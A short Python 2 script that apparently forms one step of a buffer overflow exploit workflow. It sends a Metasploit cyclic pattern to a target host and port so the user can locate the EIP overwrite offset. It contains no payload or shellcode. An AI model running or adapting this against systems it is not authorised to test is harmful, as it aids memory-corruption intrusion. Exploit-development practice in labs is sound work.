import socket
import sys
from constants import *

print "Run: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %s > pattern" % BUFFER_TOTLEN
raw_input("Press Enter when ready.")

with open('pattern') as f:
    buf = f.read().strip()

print "Sending pattern.."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
send_payload(s, buf)

print "Run: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l %s -q EIP_ADDRESS" % BUFFER_TOTLEN
print "Paste the result into constants.py as BUFFER_OFFSET"